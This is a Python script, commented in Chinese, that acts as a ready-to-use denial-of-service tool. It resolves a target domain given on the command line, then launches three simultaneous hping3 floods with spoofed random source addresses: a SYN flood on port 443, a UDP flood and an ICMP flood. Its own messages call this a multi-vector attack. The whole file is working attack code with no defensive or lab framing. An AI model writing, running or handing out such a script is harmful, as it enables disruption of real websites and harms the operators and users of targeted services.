#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import socket
import subprocess
import time
import os
import shutil

# --- ANSI 颜色代码 (用于美化终端输出) ---
C_RESET = "\033[0m"
C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_BLUE = "\033[94m"

def check_privileges():
    """检查脚本是否以 root 权限运行。"""
    if os.geteuid() != 0:
        print(f"{C_RED}错误：此脚本必须以 root 权限运行。{C_RESET}")
        print(f"请使用: {C_YELLOW}sudo python3 {sys.argv[0]} <域名>{C_RESET}")
        sys.exit(1)

def check_hping3_installed():
    """检查 hping3 是否已安装并在系统路径中。"""
    if not shutil.which("hping3"):
        print(f"{C_RED}错误：未找到 'hping3' 命令。{C_RESET}")
        print(f"请先安装它: {C_YELLOW}sudo apt-get update && sudo apt-get install hping3{C_RESET}")
        sys.exit(1)

def resolve_domain(domain):
    """将域名解析为 IP 地址。"""
    print(f"{C_BLUE}[*] 正在解析域名: {domain}...{C_RESET}")
    try:
        ip_address = socket.gethostbyname(domain)
        print(f"{C_GREEN}[+] 域名成功解析为 IP: {ip_address}{C_RESET}\n")
        return ip_address
    except socket.gaierror:
        print(f"{C_RED}[-] 域名解析失败。请检查域名是否正确或网络连接是否正常。{C_RESET}")
        return None

def start_attack(ip_address):
    """并行启动三个 hping3 进程。"""
    
    # 定义攻击命令列表
    commands = [
        ['hping3', '-S', '-p', '443', '--flood', '--rand-source', ip_address],
        ['hping3', '--udp', '--flood', '--rand-source', ip_address],
        ['hping3', '--icmp', '--flood', '--rand-source', ip_address]
    ]
    
    processes = []
    
    try:
        print(f"{C_YELLOW}🚀 正在对 {ip_address} 发动多向量攻击...{C_RESET}")
        
        # 启动每一个命令作为一个独立的进程
        for cmd in commands:
            # Popen 是非阻塞的，它会立即启动进程并继续执行
            process = subprocess.Popen(cmd)
            processes.append(process)
            print(f"   -> 进程 '{' '.join(cmd)}' 已启动，PID 为: {process.pid}")

        print(f"\n{C_GREEN}✅ 攻击正在进行中。 {len(processes)} 个进程已激活。{C_RESET}")
        print(f"{C_YELLOW}   按 Ctrl+C 来干净地停止所有攻击进程。{C_RESET}")

        # 无限循环，以保持主脚本存活，从而能够捕获 Ctrl+C
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n\n{C_RED}[!] 收到停止信号 (Ctrl+C)！{C_RESET}")
        print(f"{C_YELLOW}[*] 正在终止所有 hping3 进程...{C_RESET}")
        
        for p in processes:
            try:
                p.kill() # kill() 比 terminate() 更直接，适合用于 flood 模式的进程
                print(f"   -> 进程 {p.pid} 已终止。")
            except ProcessLookupError:
                # 进程可能已经自己结束了
                print(f"   -> 进程 {p.pid} 已经终止。")
        
        print(f"\n{C_GREEN}✅ 所有攻击进程已停止。{C_RESET}")

def main():
    # 执行前的检查
    check_privileges()
    check_hping3_installed()

    if len(sys.argv) != 2:
        print("使用方法不正确。")
        print(f"语法: {C_YELLOW}sudo python3 {sys.argv[0]} <目标域名>{C_RESET}")
        print(f"示例: {C_YELLOW}sudo python3 {sys.argv[0]} example.com{C_RESET}")
        sys.exit(1)
        
    domain = sys.argv[1]
    ip = resolve_domain(domain)
    
    if ip:
        start_attack(ip)

if __name__ == "__main__":
    main()
